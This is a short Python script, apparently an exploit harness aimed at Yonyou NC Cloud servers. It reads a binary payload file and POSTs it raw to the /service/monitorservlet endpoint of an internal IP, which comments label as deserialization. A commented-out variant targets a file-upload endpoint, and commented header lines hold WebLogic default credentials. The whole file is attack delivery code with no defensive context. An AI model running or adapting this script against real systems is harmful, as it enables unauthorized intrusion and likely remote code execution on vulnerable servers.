import requests

header = {
    # 'username': 'weblogic',
    # 'password': 'Oracle@123',
    # 'wl_request_type': 'data_transfer_request',
    # 'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'binary'
}
# #  NC Cloud 文件上传-1
# with open("1.cer",'rb') as file:
#     context = file.read()

#  NC Cloud 反序列化-1
with open("2.cer",'rb') as file:
    context = file.read()

payload = context.hex()
# # NC Cloud 文件上传-1
# r = requests.post(url="http://192.168.2.28:9991/service/resourcemanager", headers=header, data=bytes.fromhex(payload))

# NC Cloud 反序列化-1
r = requests.post(url="http://192.168.2.28:9991/service/monitorservlet", headers=header, data=bytes.fromhex(payload))

#

print(r.text)